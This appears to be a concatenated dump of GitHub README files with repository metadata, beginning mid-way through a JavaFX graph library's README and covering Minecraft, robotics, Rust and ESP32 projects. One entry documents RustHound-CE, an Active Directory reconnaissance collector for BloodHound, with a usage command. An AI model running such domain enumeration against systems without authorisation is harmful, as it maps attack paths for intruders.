    public static void main(String[] args) {
        launch();
    }

}

```


### PathGraphUI

Ready-to-use configuration with default UI.


```java
import javafx.application.Application;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.scene.layout.BorderPane;
import com.vittoriopiotti.pathgraph.app.PathGraphUI;

public class ExampleOfPathGraphUI extends Application {

    @Override
    public void start(Stage primaryStage) {

        /* 1. Create javafx window */
        BorderPane root = new BorderPane();
        Scene scene = new Scene(root,500,300);
        primaryStage.setScene(scene);

        /* 2. Show primary stage */
        primaryStage.show();

        /* 3. Instance object */
        PathGraphUI pg = new PathGraphUI(primaryStage,scene);

        /* 4. Add PathGraph in a container */
        root.setCenter(pg);

        /* 5. Setup */
        pg.setup().thenRun(() -> {

            /* 6. Make Graphs */
            pg.newNode('A');
            pg.newNode('B');
            pg.newNode('C');
            pg.newEdge('A', 'B', 1);
            pg.newEdge('C', 'A', 2, false);

        });

    }

    public static void main(String[] args) {
        launch();
    }

}

```


## 6. Callbacks <div id=""callbacks""/>

>[!NOTE]
> Customizable callbacks only with an instance of `PathGraph` _(`PathGraphUI`is a ready-to-use configuration)._

**Usage:**

1. Import package to use callback objects:

      ```java
      import com.vittoriopiotti.pathgraph.callbacks.*;
      ```
      
2. Call setter methods to apply new callbacks passing callback objects:
   
     [`Set All Callbacks`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setAllCallbacks(com.vittoriopiotti.pathgraph.callbacks.ContextMenuCallback,com.vittoriopiotti.pathgraph.callbacks.EdgeCallback,com.vittoriopiotti.pathgraph.callbacks.NodeCallback,com.vittoriopiotti.pathgraph.callbacks.BackgroundCallback,com.vittoriopiotti.pathgraph.callbacks.ZoomCallback,com.vittoriopiotti.pathgraph.callbacks.AdjustPositionCallback)), [`Set Context Menu Callback`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setContextMenuCallback(com.vittoriopiotti.pathgraph.callbacks.ContextMenuCallback)), [`Set Edge Callback`](), [`Set Node Callback`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setNodeCallback(com.vittoriopiotti.pathgraph.callbacks.NodeCallback)), [`Set Background Callback`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setBackgroundCallback(com.vittoriopiotti.pathgraph.callbacks.BackgroundCallback)), [`Set Zoom Callback`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setZoomCallback(com.vittoriopiotti.pathgraph.callbacks.ZoomCallback)), [`Set Adjust Position Callback`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#setAdjustPositionCallback(com.vittoriopiotti.pathgraph.callbacks.AdjustPositionCallback))

**Snippet:**

```java
EdgeCallback ec = (event,start,end) ->{
    if (event.getButton() == MouseButton.SECONDARY) {
        System.out.println(
                pg.rotateEdge(start,end) ?
                        ""rotate edge successfully"" :
                        ""rotate edge  error""
        );
    }else if (event.getButton() == MouseButton.PRIMARY) {
        System.out.println(
                pg.deleteEdge(start,end) ?
                        ""delete edge successfully"" :
                        ""delete edge error""
        );
    }
    event.consume();
};

(PathGraph) pg.setEdgeCallback(ec);
```



>[!TIP]
> * Use of a `ContextMenu` with custom `MenuItem` or `Button` to perform the actions
>    
> * Use `event.consume()` to prevent the propagation of the event
>
> * Use the `return status` to feedback errors with a `Modal Dialog` 






## 7. DTO ¬∑ Data Transfer Objects <div id=""data-transfer-object""/>
 
> [!NOTE]
> Read the **Javadoc** for more details: [(see)](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/dto/package-summary.html)


Providing to rappresent graph components in a simple and serializable structure.

**Import package:**

```java
import com.vittoriopiotti.pathgraph.dto.*;
```

**Usage:**

 * Converting graph data into JSON format
 * Reconstructing graph data from JSON
 * Support structure for graph operations





## 8. JSON ¬∑ Data Management <div id=""json-data-management""/>

### Methods

[`Get Nodes Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#getNodesJson()), [`Get Edges Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#getEdgesJson()), [`Get Connections Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#getConnectionsJson()), [`Get Graph Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#getGraphJson()), [`Upload Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#uploadJSON(java.io.File)), [`Download Json`](https://javadoc.io/doc/io.github.vittoriopiotti/PathGraph-JavaFX/latest/com.vittoriopiotti.pathgraph/com/vittoriopiotti/pathgraph/app/PathGraph.html#downloadJSON(java.io.File))

### Structure

**Graph**

```json
{
  ""nodes"": [""A"", ""B"",""C""],
  ""edges"": [
    {
      ""from"": ""A"",
      ""to"": ""B"",
      ""cost"": 1,
      ""isArrowed"": true
    },
    {
      ""from"": ""B"",
      ""to"": ""A"",
      ""cost"": 10,
      ""isArrowed"": true
    },
    {
      ""from"": ""B"",
      ""to"": ""C"",
      ""cost"": 2,
      ""isArrowed"": false
    }
  ]
}
```

<details>
  
<summary>
   <strong>Nodes</strong>
</summary>

```json
{
  ""nodes"": [
    ""A"",
    ""C"",
    ""B""
  ]
}
```

</details>


<details>
  
<summary>
   <strong>Edges</strong>
</summary>

```json
{
  ""edges"": [
    {
      ""from"": ""A"",
      ""to"": ""B"",
      ""cost"": 1,
      ""isArrowed"": true
    },
    {
      ""from"": ""C"",
      ""to"": ""A"",
      ""cost"": 2,
      ""isArrowed"": false
    }
  ]
}
```

</details>


<details>
  
<summary>
   <strong>Connections</strong>
</summary>

```json
{
  ""connections"": [
    {
      ""node"": ""B"",
      ""edges"": [
      ]
    },
    {
      ""node"": ""A"",
      ""edges"": [
        {
          ""to"": ""B"",
          ""cost"": 1
        },
        {
          ""to"": ""C"",
          ""cost"": 2
        }
      ]
    },
    {
      ""node"": ""C"",
      ""edges"": [
        {
          ""to"": ""A"",
          ""cost"": 2
        }
      ]
    }
  ]
}
```

</details>




## 9. Configuration and Styling <div id=""configurations-and-styling""/>


In future versions will be optimized the management of configurations and styles similar to the original project of the fork [(see)](https://github.com/brunomnsilva/JavaFXSmartGraph#configuration-and-styling).

Currently, the styles and configurations are preset and cannot be modified.



## 10. Licenses <div id=""licenses""/>


> [!NOTE]
>  SVG icons from **Bootstrap**







---

### PathGraph


**Copyright** 2024 Vittorio Piotti [(GitHub page)](https://github.com/vittorioPiotti) [(Personal page)](https://vittoriopiotti.altervista.org/) 

**Version** [v1.0.4](https://github.com/vittorioPiotti/PathGraph-JavaFX/releases/tag/1.0.4)

**License** [GPL-3.0](https://github.com/vittorioPiotti/JavaFXPathGraph/blob/master/LICENSE.txt)





---

### SmartGraph

**Copyright** 2019 - 2024 Bruno Silva [(GitHub page)](https://github.com/brunomnsilva) [(Personal page)](https://www.brunomnsilva.com/) 

**Version** [v2.0.0](https://github.com/brunomnsilva/JavaFXSmartGraph/releases/tag/v2.0.0)

**License** [MIT](https://github.com/brunomnsilva/JavaFXSmartGraph/blob/master/LICENSE.txt)



---

### Bootstrap Icons

**Copyright** 2011-2018 The Bootstrap Authors 

**Version** [v1.11.0](https://blog.getbootstrap.com/2023/09/12/bootstrap-icons-1-11-0/)

**License** [MIT](https://github.com/twbs/icons/blob/main/LICENSE)



---


## Fork-Based On SmartGraph <div id=""fork-based-on-smartgraph""/>


This library is a fork based on the source code of the [SmartGraph](https://github.com/brunomnsilva/JavaFXSmartGraph) [v2.0.0](https://github.com/brunomnsilva/JavaFXSmartGraph/releases/tag/v2.0.0) library on which existing classes have been modified and new ones have been added. PathGraph is therefore the adaptation of SmartGraph to specific path graphs features in a stable user interface.

[_See SmartGraph_](https://github.com/brunomnsilva/JavaFXSmartGraph)























































",1,0,1,GPL-3.0,,0.0
Patbox/mrpack4server,master,"# mrpack4server
mrpack4server is a ""server launcher"" that allows you to easily install and run any modpack from Modrinth
(or one that's exported in `.mrpack` format) as a Minecraft Server on your local machine or any hosting provider that supports custom jars.
This tool doesn't require any additional arguments and can work as any other server jar (like vanilla provided one).

## Features:
- For any users, usable standalone, for setup of any modpack by defining a single file.
- For modpack makers, allowing quick server setup by having to just download and run a single file.
- Automatically downloads required mrpack files and any mods / external assets defined by modpack.
- Automatically downloads and starts the server/modloader files, without requiring renaming of jars, supporting Fabric Loader, 
Quilt Loader, Forge and NeoForge.
If used with modpack for other unsupported platforms, it will still install everything, but won't be able to launch.

## Usage:
The file is run just like any other Minecraft server (`java -jar mrpack4server.jar`) and will use / pass
through any arguments given to it. When used on its own, it first looks in 3 places for modpack definition:
- `modpack-info.json` included within jar itself, useful for modpack makers. See below for definition,
- `modpack-info.json` in server's root directory (alongside jar), defined for general user setups,
- `local.mrpack` in server's root directory (alongside jar), making it directly use provided mrpack file instead of 
pulling one from Modrinth.

If neither of these is found, it will ask you to either provide link, project id or name of the modpack you want to install
and then the version of it (suggesting latest one), which will be used to create local `modpack-info.json` file. 
You can then either update target version by editing it or by removing the file and rerunning the initial setup.

Default/main jar only supports Java 21 (`mrpack4server-X.Y.Z.jar`). If you want to run it on older Java version you can use:
- `mrpack4server-X.Y.Z-jvm8.jar` for Java 8 and above,
- `mrpack4server-X.Y.Z-jvm16.jar` for Java 16 and above,
- `mrpack4server-X.Y.Z-jvm17.jar` for Java 17 and above.

These versions however don't override requirements of Minecraft/Loader itself. 
For example, you still need Java to use Java 17 or above to run Minecraft 1.20.1 and Java 8 (but not newer!) to run Forge 1.16.5.

You can get download preconfigured jar by downloading it from `https://mrpack4server.pb4.eu/download/<MODPACK>/<VERSION>/<JAVA>/server.jar` url,
where you replace `<MODPACK>` with project id or slug, `<VERSION>` for modpack version, `<JAVA>` for java base used.
For example `https://mrpack4server.pb4.eu/download/polymania/0.2.1/jvm21/server.jar` will download launcher for Polymania 0.2.1, using Java 21 variant
of the mrpack4server. Currently supported variants are `jvm21`, `jvm17`, `jvm16` and `jvm8`.

You can also create bundled variant by hand with some zip software or by running `java -cp mrpack4server.jar eu.pb4.mrpackserver.Create`.
By default, without any arguments, it will copy currently provided `modpack-info.json` file, but you can also set it with arguments (`--arg value`),
where it mirrors all arguments from `modpack-info.json` (aka `--project_id my_modpack --version_id 1.2.3` will create jar with these defined).
Additionally, you can use the `--out` argument to set output file path, by default being set to `--out server.jar`.

### `modpack-info.json` format:
`modpack-info.json` is a regular json file without support for comments. Ones provided below are purely
to make easier to describe things.
```json5
{
  // (Optional) Display name, used to display as information while starting / download files.
  ""display_name"": ""My Modpack"",
  // (Optional) Display version, used to display as information while starting / download files.
  ""display_version"": ""1.0.0 for 1.21.1"",
  // Project id used on Modrinth and locally, identifying modpack as unique. Can use slug or ID
  ""project_id"": ""my_modpack_by_patbox"",
  // Version id used on Modrinth and locally, identifying used version. Can be a version number, version id or prefixed version type.
  // As version type, you can set it to "";;release"", "";;beta"" or "";;alpha"", making it download latest version with highest
  // version number! For most use cases, I would recommend not using this functionality, unless you are 100% modpack's version is consistent
  // and non-hard breaking. For stability, you should use version numbers directly.
  ""version_id"": ""1.0.0"",
  // (Optional) Overrides url used to download the modpack, can download it from anywhere. 
  ""url"": ""https://files.pb4.eu/modpacks/my_modpack.mrpack"",
  // (Optional) Size of the file downloaded from ""url"", in bytes. It's not required even with ""url"" used.
  ""size"": 1000,
  // (Optional) Value of sha512 hash for file downloaded from ""url"", used for validation. It's not required even with ""url"" used.
  ""sha512"": 1000,
  // (Optional) Additional list of whitelisted domains, only useful for modpacks hosted outside Modrinth.
  ""whitelisted_domains"": [
    ""files.pb4.eu"" // Note it's just a domain, no protocol/ports/paths.
  ],
  // (Optional) Allows to url used for requesting list of available versions, used by auto-updating feature (the ;; versions).
  ""version_list_url"": ""https://api.modrinth.com/v2/project/{PROJECT_ID}/versions""
}
```

Examples:
- Installing Adrenaline version 1.25.0+1.21.1.fabric.
```json
{
  ""project_id"": ""adrenaline"",
  ""version_id"": ""1.25.0+1.21.1.fabric""
}
```
- Installing Cobblemon Official Modpack v1.5.2 (using id's copied from website).
```json
{
  ""project_id"": ""5FFgwNNP"",
  ""version_id"": ""bpaivauC""
}
```
",5,0,1,MIT,"build.yml,release.yml",3.0
Shenzhen-Robotics-Alliance/maple-sim,main,"<p align=""center"">
  <img src=""./docs/media/team_logo.png"" width=""20%""  alt=""team logo""/>
  <img src=""./docs/media/icon.png"" width=""79%""  alt=""project logo""/>
</p>

### Elevating FRC Java Robot Simulations to the Next Level with Physics Engines

## Why a physics engine
A simulation engine is a powerful tool that provides realistic approximations of physical systems. With **maple-sim**, we integrate the open-source Java rigid-body dynamics engine, [dyn4j](https://github.com/dyn4j/dyn4j), capable of simulating 2D forces and collisions between rigid shapes. This integration transforms the scope of robot simulations by enabling realistic interactions between robots, field elements, and game pieces.

![physics engine illustration](./docs/media/physics%20engine.png)

Before **maple-sim**, most FRC robot simulations focused solely on the robot itself‚Äîits sensors, movements, and internal operations. 
Now, through the power of physics simulation, **maple-sim** allows your robot to engage directly with its environment. 
Imagine testing robot interactions with obstacles, field elements, and game pieces, all within the simulated world.
A simulation that is realistic enough to **feel like a video game.**

[![Demo Video 1](./docs/media/demo%20video%20cover.png)](https://www.youtube.com/watch?v=CBx1_Dosgec)


With this advanced level of simulation, the possibilities are endless. You can:

- Test autonomous modes with pinpoint accuracy.
- Fine-tune advanced TeleOp enhancement features like pathfinding-auto-alignment.
- Optimize shooters and other subsystems, all while gathering meaningful data from simulated physics.

**And the best part? You can achieve all of this without needing a real robot on hand.**

## Online Documentation
[Online documentation is here](https://shenzhen-robotics-alliance.github.io/maple-sim/).
> üôè  Big thanks to [@GrahamSH-LLK](https://www.chiefdelphi.com/u/nstrike/summary) for all the help in setting up the online documentation.


## Java Docs
[Official javadocs is here](https://shenzhen-robotics-alliance.github.io/maple-sim/javadocs/).
> üôè  Big thanks to [@nstrike](https://www.chiefdelphi.com/u/nstrike/summary) for all the help in setting up the Java Docs.



## Bugs Developing and Contributing

- If you've encountered a bug while using maple-sim in your robot code, please [submit an issue](https://github.com/Shenzhen-Robotics-Alliance/maple-sim/issues/new/choose) and select the ""Bug Report"" option.  We review issues regularly and will respond as quickly as possible.

- If you have an idea for a new feature, please [submit an issue](https://github.com/Shenzhen-Robotics-Alliance/maple-sim/issues/new/choose) and select the ""Feature Request"" option.

- If you think the API for an existing feature could be improved for better readability or usability, please [submit an issue](https://github.com/Shenzhen-Robotics-Alliance/maple-sim/issues/new/choose) and select the ""API Enhancement"" option.

- For detailed guidelines on contributing to the project, please refer to the [contribution guide](https://shenzhen-robotics-alliance.github.io/maple-sim/CONTRIBUTION.html).",2,3,4,BSD-3-Clause,docs.yml,45.0
KMJ-007/lazygh,main,"# LazyGH

‚ö†Ô∏è **WARNING: This project is highly under development. Do not use in production. There are several security issues which are yet to be addressed.** ‚ö†Ô∏è

LazyGH is a Terminal User Interface (TUI) application for managing multiple GitHub accounts easily. It allows you to switch between different Git configurations and SSH keys seamlessly.

## Demo

Check out the demo to see LazyGH in action:

![LazyGH Demo](https://cloud-hq5v2c9l2-hack-club-bot.vercel.app/0demo.gif)

## Features

- Manage multiple GitHub accounts
- Switch between accounts with ease
- Automatically update Git global configuration
- Generate and manage SSH keys for each account
- Copy SSH public keys to clipboard

## Contributing

Contributions are welcome! Here's how you can contribute:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

Please make sure to update tests as appropriate and adhere to the existing coding style.

## Issues

If you encounter any problems or have suggestions for improvements, please open an issue on the [GitHub Issues page](https://github.com/KMJ-007/lazygh/issues).

## Roadmap

- [ ] fix the cargo auto release version mangment with release workflow 
- [ ] adding lazygh to binstall
- [ ] adding lazygh to nix-env
- [ ] adding lazygh to nix flake
- [ ] ability to maintain multiple gh config files and able to categorise them in workspace fashion but in simpler way
- [ ] don't know other things to add, create an issue if you have any ideas

## Security

LazyGH takes your security seriously. If you discover a security vulnerability within LazyGH, please send an e-mail to Karan Janthe via karanjanthe@gmail.com. All security vulnerabilities will be addressed.

## Acknowledgements

- [Ratatui](https://github.com/ratatui-org/ratatui) for the excellent TUI framework
- [Tweet](https://x.com/KaranJanthe/status/1835380523235193310) for the idea and inspiration
- All the contributors who have helped shape LazyGH

## Contact

Karan Janthe - [@KaranJanthe](https://twitter.com/karanjanthe)

Project Link: [https://github.com/KMJ-007/lazygh](https://github.com/KMJ-007/lazygh)
",2,2,8,MIT,"ci.yml,release.yml,web.yml",0.0
jamesmcm/esp32_wifi_tank,master,"# Wifi Tank project

This project is an ESP32 Wifi-controlled tank/rover with a camera.

![Frontal photo of built rover](./wifitank.jpg)

## Software

The project consists of three crates for the rover control board, a client on the host machine, and the camera board. All should be able to connect to the same Wifi network.

To build them install Rust and `espup` and run:

```bash
$ source ~/export-esp.sh
$ cargo run --release
```

### wifi_tank
Crate link: [wifi_tank](./wifi_tank/)

This crate contains the ESP32 code for the control board on the rover itself.
This should be flashed onto that board.

Your Wifi credentials should be added to `.cargo/config.toml` before building,
and use 2.5GHz Wifi and WPA2 personal authentication.

The rover will connect to the Wifi with the hostname `wifitank` and
listen for a UDP connection from the client on port 8080.

### wifi_tank_controller_client
Crate link: [wifi_tank_controller_client](./wifi_tank_controller_client/)

This client runs on the host machine connected to the same Wifi, and
communicates to the control board and camera board on the rover via
their hostnames (`wifitank` and `espressif` respectively).

It expects a USB gamepad for input and uses the Directional Pad for
controls.

### esp32cam
Crate link: [esp32cam](./esp32cam/)

This crate contains the ESP32 code for the ESP32-CAM module and should
be flashed onto the camera board (see below for flashing details). The
code serves a stream on HTTP at [http://espressif/camera](http://espressif/camera)
once connected to the Wifi.

This code is a modified version of [@Kezii's esp32cam_rs](https://github.com/Kezii/esp32cam_rs) crate.

Initialise the `esp32-camera` git submodule with:

```bash
$ git submodule update --init
```

The Wifi credentials should be added in `.cargo/config.toml` as for the the `wifi_tank` crate.

## Hardware

- Control board: Any ESP32 development board - although one with 5V
  output is preferable. A Lolin D32 Pro board was used in development
  (but this does not have 5V out). Note this code is written for ESP32 Qtensa
  boards but it should be simple to adapt for the ESP32-C series RISC-V based ones too.
- ESP32-CAM module.
- Any USB-UART adapter to flash the ESP32-CAM module.
- Any power bank to power the control board (via micro-USB).
- A 4-battery AA battery holder for powering the motors (I used
  rechargeable batteries).
- 4x L298N motor drivers (or any that will work with 3.3V control inputs)
- 4x DC Gearbox motors (I used the ""TT Motor"" ones)
- A robot car chassis (I used the Elegoo one, but you could also cut
  this from card).

### Flashing ESP32-CAM module

In order to flash the ESP32-CAM module you must connect the `IO0` pin to
the adjacent `GND` pin.

Then connect the UART adapter with the UART `TX` pin connecting to the `U0R`
pin on the ESP32-CAM, and the UART `RX` pin connecting to the `U0T` pin.
Use the 5V output on the UART adapter (if possible) to the 5V input on the ESP32-CAM,
and connect the ground from the UART adapter to the adjacent ground pin
next to the 5V input (do not use the `GND/R` reset pin as this keeps the
device resetting).

Once connected you must reset the ESP32-CAM with the reset button on the
board immediately before flashing, you then have ~2 seconds to start the
flashing process with espflash.

You can then connect it without the `IO0` jumper to test it (and see the serial output with `picom`).

### GPIO Pin setup

#### Control board (Lolin D32 Pro)

See [LastMinuteEngineers' Interface L298N DC Motor Driver Module with Arduino article](https://lastminuteengineers.com/l298n-dc-stepper-driver-arduino-tutorial/) for help with the Motor Driver pins.

Connect the ground pin of the control board to the shared ground connections of the motor drivers.

Left motor:

- Pin 13 to EN1
- Pin 12 to EN2
- Pin 26 to EN3
- Pin 25 to EN4


Right motor:

- Pin 21 to EN1
- Pin 19 to EN2
- Pin 22 to EN3
- Pin 23 to EN4

#### ESP32-CAM

Here the GPIO pins all dealt with internally and the board communciates over Wifi.

Connect the 5V input to a 5V source (e.g. from the UART converter or a 5V output from the control board if possible).
Connect the grounds with the 5V source.

Note you can use the 5V output from the L298N motor drivers, however at higher input voltages this is not guaranteed to be stable.

Note technically the ESP32-CAM also supports 3.3V input, but this is unreliable and often hits brownout issues when actually working.

Note this code requires SPI RAM to be enabled - `CONFIG_ESP32_SPIRAM_SUPPORT=y` in sdkconfig.defaults

## Possible improvements

- Support ESP BLE Provisioning for setting the Wifi credentials via BLE for both
  boards.
- Create a nostd version of the esp32cam crate.
- Motor speed control (use ENA and ENB pins with PWM).
- Test external antenna for ESP32-CAM

## Useful Resources

- [@flyaruu's esp32-nostd crate](https://github.com/flyaruu/esp32-nostd) - the best reference for nostd esp_wifi usage.
- [Floodplain's Rust on ESP32 no_std YouTube series](https://www.youtube.com/watch?v=o8yNNVFzNnM&list=PL0U7YUX2VnBFbwTi96wUB1nZzPVN3HzgS)
- [Embassy on ESP blog series](https://dev.to/theembeddedrustacean/embassy-on-esp-gpio-5594)
- [ESP32 Embedded Rust at the HAL blog series](https://blog.theembeddedrustacean.com/esp32-embedded-rust-at-the-hal-gpio-interrupts)
- [LastMinuteEngineers' in-depth L298N motor driver tutorial](https://lastminuteengineers.com/l298n-dc-stepper-driver-arduino-tutorial/)
- [Rust Networking with the Raspberry Pi Pico](https://murraytodd.medium.com/rust-networking-with-the-raspberry-pi-pico-w-002384a5954b)
- [Rust Client/Server Comms on the Raspberry Pi Pico](https://murraytodd.medium.com/client-server-comms-on-the-raspberry-pi-pico-w-b0767ecfb4dc)
- [IoT with Rust on ESP](https://dev.to/theembeddedrustacean/iot-with-rust-on-esp-connecting-wifi-4be6)
- [Connect ESP32 to Wifi with Rust](https://medium.com/@rajeshpachaikani/connect-esp32-to-wifi-with-rust-7d12532f539b)
- [LastMinuteEngineers' Getting Started with ESP32 CAM](https://lastminuteengineers.com/getting-started-with-esp32-cam/)
",0,0,1,Apache-2.0,,1.0
AarambhDevHub/file-share-rust-backend,main,"# Rust Backend File Share with End-to-End Encryption

[![Watch the video](https://img.youtube.com/vi/t5w2dauFmhM/maxresdefault.jpg)](https://youtu.be/t5w2dauFmhM)

This project implements a file sharing backend using Rust, featuring end-to-end encryption to ensure the privacy and security of shared files.

## Table of Contents

- [Features](#features)
- [Technologies Used](#technologies-used)
- [Getting Started](#getting-started)
- [API Endpoints](#api-endpoints)
- [License](#license)
- [Donations](#donations)

## Technologies Used

   - **Rust**: The primary programming language for the backend.
   - **Axum**: A lightweight and ergonomic web framework for building APIs in Rust.
   - **SQLx**: An asynchronous, compile-time verified SQL crate supporting multiple databases (in this case, PostgreSQL).
   - **Argon2**: A secure password hashing library.
   - **jsonwebtoken**: A library for encoding and decoding JSON Web Tokens (JWT) for authentication.
   - **dotenv**: For managing environment variables in development.
   - **Tokio**: An asynchronous runtime for Rust, powering the non-blocking operations.
   - **Axum-Extra**: Additional utilities for Axum, including cookie support.
   - **Tokio-Cron-Scheduler**: A scheduler library for running tasks periodically based on cron-like expressions.
   - **Tower & Tower-HTTP**: Middleware and utilities for building robust HTTP services, including CORS and tracing support.
   - **Serde & Serde JSON**: A framework for serializing and deserializing Rust data structures efficiently, used with JSON data.
   - **Validator**: A validation framework for input validation in Rust.
   - **Chrono**: A date and time library, used with `serde` for working with time formats.
   - **UUID**: A library for generating and parsing universally unique identifiers (UUIDs).
   - **Tracing Subscriber**: A logging library for Rust applications, providing structured logging.
   - **AES & Block Modes**: Libraries for Advanced Encryption Standard (AES) encryption.
   - **RSA**: A library for RSA encryption and decryption.
   - **Rand**: A library for generating random values, used in cryptography and token generation.
   - **Base64**: A library for encoding and decoding Base64, often used in file and cryptographic operations.

## Technologies Used

- **Rust**: The primary programming language for the backend.
- **Actix Web**: A powerful, pragmatic, and extremely fast web framework for Rust.
- **SQLx**: An asynchronous, compile-time verified SQL crate.
- **Argon2**: Password hashing library for secure user authentication.
- **jsonwebtoken**: Library for encoding and decoding JWT tokens.
- **dotenv**: To manage environment variables.

## Getting Started

To get a local copy of this project up and running, follow these steps:

### Prerequisites

- Rust (1.58 or newer) installed. You can install Rust using [rustup](https://rustup.rs/).
- PostgreSQL installed and running. Ensure you have a database created for this project.

### Installation

1. Clone the repository:

   ```
   git clone https://github.com/AarambhDevHub/file-share-rust-backend.git
   cd file-share-rust-backend
   ```
2. Create a .env file in the root of the project with the following variables:

    ```
    # -----------------------------------------------------------------------------
    # Database (PostgreSQL)
    # -----------------------------------------------------------------------------
    DATABASE_URL=postgresql://username:password@localhost:5432/file_share_tutorial 

    # -----------------------------------------------------------------------------
    # JSON Web Token Credentials
    # -----------------------------------------------------------------------------
    JWT_SECRET_KEY=my_ultra_secure_jwt_secret_key
    JWT_MAXAGE=60
    ```

3. Install the necessary dependencies:

    ```
    cargo build
    ```

4. Run database migrations:

    ```
    sqlx migrate run
    ```

5. Start the server

    ```
    cargo run
    ```

## API Endpoints

- **POST /api/auth/register**: Register a new user.
- **POST /api/auth/login**: Login a user and return a JWT token.
- **GET /api/users/me**: Retrieve the authenticated user's information.
- **PUT /api/users/name**: Update the authenticated user's name.
- **PUT /api/users/password**: Change the authenticated user's password.
- **GET /api/users/search-emails**: Search for users by their email addresses.
- **POST /api/file/upload**: Upload a file (requires authentication).
- **GET /api/file/retrieve**: Retrieve an uploaded file by ID (requires authentication).
- **POST /api/list/send**: Send a list of files to another user.
- **GET /api/list/receive**: Retrieve the list of files received from another user.

## License

This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.

## Donations

If you find this project useful and would like to support its continued development, you can make a donation via [Buy Me a Coffee](https://buymeacoffee.com/aarambhdevhub).

Thank you for your support!
",0,0,1,MIT,,1.0
g0h4n/RustHound-CE,main,"<p align=""center"">
    <picture>
        <source media=""(prefers-color-scheme: dark)"" srcset=""https://github.com/g0h4n/RustHound-CE/raw/main/img/rusthoundce-transparent-dark-theme.png"">
        <source media=""(prefers-color-scheme: light)"" srcset=""https://github.com/g0h4n/RustHound-CE/raw/main/img/rusthoundce-transparent-light-theme.png"">
        <img src=""https://github.com/g0h4n/RustHound-CE/raw/main/img/rusthoundce-transparent-dark-theme.png"" alt=""rusthound-ce logo"" width='250' />
    </picture>
</p>

<hr />

RustHound-CE is a cross-platform and cross-compiled BloodHound collector tool written in Rust, making it compatible with Linux, Windows, and macOS. It therefore generates all the JSON files that can be analyzed by BloodHound Community Edition. This version is only compatible with [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound). The version compatible with [BloodHound Legacy](https://github.com/BloodHoundAD/BloodHound) can be found on [NeverHack's github](https://github.com/NH-RED-TEAM/RustHound).

RustHound was created during my years as a pentester at Armature Technologies, renamed later Opencyber then NeverHack. I would like to thanks NeverHack for giving me time to research and develop the original RustHound project, which is still available on their github. We've decided to continue working together to contribute to both versions. This one will remain compatible with the community edition, and the NeverHack version with the Legacy version of BloodHound.

- [HELP.md](HELP.md) - How to compile it and how to use it?
- [ROADMAP.md](ROADMAP.md) - List of planned evolutions
- [LINKS.md](LINKS.md) - Useful resources

# Quick usage

## Compilation

This project can be compiled directly from `make` command like:

```bash
# Compile it for your current system
make release
# Compile it for Windows
make windows
```

Or using `docker` like below:

```bash
docker build --rm -t rusthound-ce .

# Then
docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce help
docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce release
docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce windows
docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce linux
```

## Usage

Here's an example of a command to collect domain objects and obtain the zip archive containing the json files to be imported into BloodHound CE:

```bash
rusthound-ce -d DOMAIN.LOCAL -u USERNAME@DOMAIN.LOCAL -z
```

More information and examples with how to compile RustHound-CE or how to use RustHound-CE can be found directly on the [help page](HELP.md).

# Special thanks to 

[![](https://github.com/NH-RED-TEAM.png?size=50)](https://github.com/NH-RED-TEAM)
[![](https://github.com/f3rn0s.png?size=50)](https://github.com/f3rn0s)
[![](https://github.com/barney0.png?size=50)](https://github.com/barney0)",0,0,1,MIT,,0.0
EasonLyo/sigma,main,"# SIGMA

üëÜ[‰∏≠ÊñáÊñáÊ°£](./README_zh.md)

> WARNING: [Eclipse Vert.x 5 candidate 1 released!](https://vertx.io/blog/eclipse-vert-x-5-candidate-1-released/), we plan to upgrade SIGMA vertx version, some method or code will change.

##  Introduction

Sigma is a high performances API gateway based on Vertx(Netty), can execute on native image.

### [Based on vertx](https://vertx.io/)
Vertx is a reactive web framework on JVM,  it provides many of out-of-the-box feature.

Thanks to the Vertx ecosystem, Sigma can achieve extremely high performance at a minimal cost.

Here is some vertx module sigma used:
- vertx core
- vertx web
- vertx http proxy
- vertx io_uring

### [Vertx io_uring](https://vertx.io/docs/vertx-io_uring-incubator/java/)
